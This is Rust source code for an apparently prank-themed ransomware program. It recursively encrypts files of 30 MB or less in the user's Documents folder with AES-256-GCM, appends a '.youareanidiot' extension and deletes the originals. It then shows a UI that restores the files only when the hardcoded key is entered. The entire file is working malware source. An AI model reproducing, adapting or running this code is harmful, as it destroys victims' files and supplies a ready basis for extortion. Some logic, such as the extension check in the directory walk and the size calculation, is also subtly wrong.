use std::{
    fs::File,
    io::Read,
    path::{Path, PathBuf},
};

use aes_gcm::{aead::Aead, Aes256Gcm, Key, KeyInit, Nonce};
use rand::Rng;
use slint::SharedString;

const SECRET_DECRYP_KEY: &[u8; 32] = b"YouAreAnIdiotAhHahaHaHahaHaHaHaa";

const EXTENSION: &str = ".youareanidiot";
slint::include_modules!();

fn main() {
    let home_dir = dirs::document_dir().unwrap();

    let mut clear_paths = vec![];
    read_dir_recur(&home_dir, &mut clear_paths, false);

    for f in &clear_paths {
        println!("{f:?}");
    }

    encrypt_files(&clear_paths);

    let ui = UI::new().unwrap();

    ui.on_decrypt_files(move |key: SharedString| -> SharedString {
        let s = decrypt_files(&home_dir, &key).into();
        println!("{s}");
        s
    });

    ui.run().unwrap();
}

fn encrypt_files(files: &[PathBuf]) {
    for p in files {
        match std::fs::metadata(&p) {
            Ok(m) => {
                if m.len() <= 1024 * 1024 * 30 {
                    // <= 30mb file, we encrypt
                    match File::open(&p) {
                        Ok(mut f) => {
                            let mut buffer = vec![0; m.len() as usize];
                            match f.read(&mut buffer) {
                                Ok(_) => {
                                    let encrypted = encrypt(SECRET_DECRYP_KEY, &buffer);
                                    let encrypted_p = {
                                        let mut p = p.display().to_string();
                                        p.push_str(EXTENSION);
                                        p
                                    };
                                    match std::fs::write(&encrypted_p, &encrypted) {
                                        Ok(_) => {
                                            eprintln!("{:?}", std::fs::remove_file(p));
                                        }
                                        Err(e) => eprintln!(
                                            "could not write file {p:?} {e}  {encrypted_p:?}"
                                        ),
                                    }
                                }
                                Err(e) => eprintln!("buffer overflow {p:?} {e}"),
                            }
                        }
                        Err(e) => eprintln!("could not open file {e} => {p:?}"),
                    }
                } else {
                    eprintln!(
                        "file too big, probably a movie or smth : {}mb => {p:?}",
                        1024 * 1024 * m.len()
                    )
                }
            }
            Err(e) => eprintln!("could not extract metadata, {e}"),
        }
    }
}

fn decrypt_files(root_dir: &Path, key: &str) -> String {
    if key.as_bytes() != SECRET_DECRYP_KEY {
        "invalid key".into()
    } else {
        let mut enc_paths = vec![];
        read_dir_recur(root_dir, &mut enc_paths, true);
        for p in &enc_paths {
            println!("{p:?}");
            match std::fs::metadata(&p) {
                Ok(m) => match File::open(&p) {
                    Ok(mut f) => {
                        let mut buffer = vec![0; m.len() as usize];
                        match f.read(&mut buffer) {
                            Ok(_) => {
                                let decrypted = decrypt(SECRET_DECRYP_KEY, &buffer);
                                let decrypted_p =
                                    p.to_path_buf().display().to_string().replace(EXTENSION, "");
                                match std::fs::write(decrypted_p, &decrypted) {
                                    Ok(_) => {
                                        eprintln!("{:?}", std::fs::remove_file(p));
                                    }
                                    Err(e) => eprintln!("could not write file {p:?} {e}"),
                                }
                            }
                            Err(e) => eprintln!("buffer overflow {p:?} {e}"),
                        }
                    }
                    Err(e) => eprintln!("could not open file {e} => {p:?}"),
                },
                Err(e) => eprintln!("could not extract metadata, {e}"),
            }
        }
        format!("successfully decrypted with {key}")
    }
}

fn read_dir_recur(p: &Path, paths: &mut Vec<PathBuf>, only_encrypted: bool) {
    if p.is_dir() {
        match std::fs::read_dir(&p) {
            Ok(dir) => {
                for path in dir {
                    match path {
                        Ok(path) => {
                            let path = path.path();

                            if path.is_dir() {
                                read_dir_recur(&path, paths, only_encrypted);
                            } else if path.is_file() {
                                if only_encrypted && p.ends_with(EXTENSION) {
                                    paths.push(path);
                                } else if !p.ends_with(EXTENSION) {
                                    paths.push(path);
                                }
                            }
                        }
                        Err(e) => eprintln!("could not read path {e}"),
                    }
                }
            }
            Err(e) => eprintln!("cannot read file path: {e}"),
        }
    } else if p.is_file() {
        if only_encrypted && p.ends_with(EXTENSION) {
            paths.push(p.to_path_buf());
        } else if !p.ends_with(EXTENSION) {
            paths.push(p.to_path_buf());
        }
    }
}

fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));

    let mut rng = rand::rng();
    let mut nonce_bytes = [0u8; 12];
    rng.fill(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .expect("encryption failure!");

    let mut encrypted_data = Vec::with_capacity(12 + ciphertext.len());
    encrypted_data.extend_from_slice(&nonce_bytes);
    encrypted_data.extend_from_slice(&ciphertext);

    encrypted_data
}

fn decrypt(key: &[u8; 32], encrypted_data: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));

    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher
        .decrypt(nonce, ciphertext)
        .expect("decryption failure!")
}
